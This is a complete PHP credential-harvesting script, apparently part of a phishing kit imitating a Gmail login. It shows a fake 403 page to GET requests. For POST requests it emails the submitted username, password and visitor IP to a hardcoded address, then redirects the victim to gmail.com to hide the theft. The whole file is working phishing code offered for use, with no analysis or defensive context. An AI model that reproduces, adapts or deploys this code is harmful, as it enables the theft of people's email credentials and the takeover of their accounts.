<?
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}
$rezmail1 = "eduking20089@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------------------------------------\n";
$message .= "user: ".$_POST['login']."\n";
$message .= "pass: ".$_POST['passwd']."\n";
$message .= "---------------------Created by Nakedwire------------------------------\n";
$subject = "Gmail email+pass :) $ip";
$headers .= "MIME-Version: 1.0\n";
mail($rezmail1,$subject,$message,$headers);
Header ("Location: http://gmail.com");
?>
